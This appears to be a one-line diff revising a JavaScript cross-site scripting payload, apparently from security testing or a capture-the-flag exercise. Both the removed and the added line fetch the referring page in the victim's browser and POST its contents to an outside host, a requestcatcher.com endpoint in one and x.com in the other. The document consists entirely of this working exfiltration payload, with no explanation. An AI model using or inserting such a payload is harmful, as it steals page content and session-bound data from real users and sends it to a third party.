@@ -1,1 +1,1 @@
-fetch(document.referrer).then(r=>r.text()).then(r=>fetch("//polar.requestcatcher.com/test",{method:"post",body:r}))
+fetch(document.referrer).then(r=>fetch('//x.com',{method:'POST',body:r.body,duplex:'half'}))
